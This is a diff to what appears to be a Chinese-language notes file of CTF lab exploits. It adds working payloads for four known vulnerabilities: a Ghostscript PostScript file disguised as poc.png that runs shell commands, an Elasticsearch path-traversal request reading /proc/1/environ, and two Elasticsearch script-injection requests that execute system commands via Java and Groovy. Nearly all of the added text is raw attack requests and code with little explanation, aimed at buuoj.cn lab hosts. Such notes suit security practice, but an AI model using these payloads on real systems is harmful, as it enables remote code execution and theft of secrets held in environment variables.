@@ -8,6 +8,10 @@
 - [s2-005](#s2-005)
 - [Postgres-CVE-2019-9193](#Postgres-CVE-2019-9193)
 - [CVE-2019-5418](#CVE-2019-5418)
+- [Ghostscript-CVE-2018-16509](#Ghostscript-CVE-2018-16509)
+- [ElasticSearch-CVE-2015-3337](#ElasticSearch-CVE-2015-3337)
+- [ElasticSearch-CVE-2014-3120](#ElasticSearch-CVE-2014-3120)
+- [ElasticSearch-CVE-2015-1427](#ElasticSearch-CVE-2015-1427)
 
 
 ## PHP-XXE
@@ -130,4 +134,136 @@ Accept-Encoding: gzip, deflate
 Accept-Language: zh-CN,zh;q=0.9
 Cookie: UM_distinctid=17b865c3e394c2-036255e722aa89-c343365-1fa400-17b865c3e3a43b; _blog_session=yk3j3zdsE38sGRr1qChqiP2c%2FsLP6%2FtP1%2FbNQ%2B2h8cFWVt0DIfVVFPKOcetA7wbAOkrZjWGwL4%2F00d6NYn7RSdUbgKrh4yhR%2FA3Zh13GPpdT8PA5nipbtFr%2Bv4Cp2YUu1HBuaMrvxiV1x8bIsQg%3D--wfXpXJkuxo69%2B2rQ--BYQP7mw53G7Eg%2F4MyvECHg%3D%3D
 Connection: close
+```
+
+## Ghostscript-CVE-2018-16509
+
+另存为poc.png
+```
+%!PS
+userdict /setpagedevice undef
+save
+legal
+{ null restore } stopped { pop } if
+{ legal } stopped { pop } if
+restore
+mark /OutputFile (%pipe%env > /tmp/success && cat /tmp/success) currentdevice putdeviceprops
+```
+
+直接上传可打印环境变量
+
+
+## ElasticSearch-CVE-2015-3337
+
+
+在安装了具有“site”功能的插件以后，插件目录使用../即可向上跳转，导致目录穿越漏洞，可读取任意文件。没有安装任意插件的elasticsearch不受影响。
+
+影响版本：1.4.5以下/1.5.2以下
+
+以下不要在浏览器访问
+```
+GET /_plugin/head/../../../../../../../../../proc/1/environ HTTP/1.1
+Host: node4.buuoj.cn:25305
+Pragma: no-cache
+Cache-Control: no-cache
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: UM_distinctid=17b865c3e394c2-036255e722aa89-c343365-1fa400-17b865c3e3a43b
+Connection: close
+```
+
+## ElasticSearch-CVE-2014-3120
+
+```
+POST /website/blog/ HTTP/1.1
+Host: node4.buuoj.cn:29898
+Pragma: no-cache
+Cache-Control: no-cache
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: UM_distinctid=17b865c3e394c2-036255e722aa89-c343365-1fa400-17b865c3e3a43b
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 25
+
+{
+  "name": "phithon"
+}
+```
+
+```
+POST /_search?pretty HTTP/1.1
+Host: node4.buuoj.cn:29898
+Pragma: no-cache
+Cache-Control: no-cache
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: UM_distinctid=17b865c3e394c2-036255e722aa89-c343365-1fa400-17b865c3e3a43b
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 357
+
+{
+    "size": 1,
+    "query": {
+      "filtered": {
+        "query": {
+          "match_all": {
+          }
+        }
+      }
+    },
+    "script_fields": {
+        "command": {
+            "script": "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"env\").getInputStream()).useDelimiter(\"\\\\A\").next();"
+        }
+    }
+}
+```
+
+## ElasticSearch-CVE-2015-1427
+
+```
+POST /website/blog/ HTTP/1.1
+Host: node4.buuoj.cn:29618
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: UM_distinctid=17b865c3e394c2-036255e722aa89-c343365-1fa400-17b865c3e3a43b
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 22
+
+{
+  "name": "test"
+}
+```
+
+```
+POST /_search?pretty HTTP/1.1
+Host: node4.buuoj.cn:29618
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: UM_distinctid=17b865c3e394c2-036255e722aa89-c343365-1fa400-17b865c3e3a43b
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 157
+
+{"size":1, "script_fields": {"lupin":{"lang":"groovy","script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"env\").getText()"}}}
 ```
